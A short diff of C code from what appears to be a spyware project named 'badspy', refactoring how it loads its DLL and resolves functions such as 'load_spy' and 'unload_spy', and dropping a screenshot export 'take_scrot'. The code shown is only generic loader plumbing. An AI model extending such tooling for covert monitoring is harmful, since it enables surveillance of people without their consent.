@@ -59,8 +59,7 @@ bool init_library()
 	LOG("Loading dll library");
 	if ((badspyDllModule = LoadLibraryA("badspy.c.dll")) == NULL)
 		return false;
-	badspyModule = GetModuleHandleA("badspy.c.dll");
-	if (badspyModule == NULL)
+	if ((badspyModule = GetModuleHandleA("badspy.c.dll")) == NULL)
 		return false;
 	LOG("Loaded dll library");
 	return true;
@@ -69,14 +68,9 @@ bool init_library()
 bool init_dll_func()
 {
 	LOG("Loading dll functions");
-	load_spy = (LOAD_SPY)GetProcAddress(badspyModule, "load_spy");
-	if (load_spy == NULL)
+	if ((load_spy = (LOAD_SPY)GetProcAddress(badspyModule, "load_spy")) == NULL)
 		return false;
-	unload_spy = (UNLOAD_SPY)GetProcAddress(badspyModule, "unload_spy");
-	if (unload_spy == NULL)
-		return false;
-	take_scrot = (TAKE_SCROT)GetProcAddress(badspyModule, "take_scrot");
-	if (take_scrot == NULL)
+	if ((unload_spy = (UNLOAD_SPY)GetProcAddress(badspyModule, "unload_spy")) == NULL)
 		return false;
 	LOG("loaded dll functions");
 	return true;
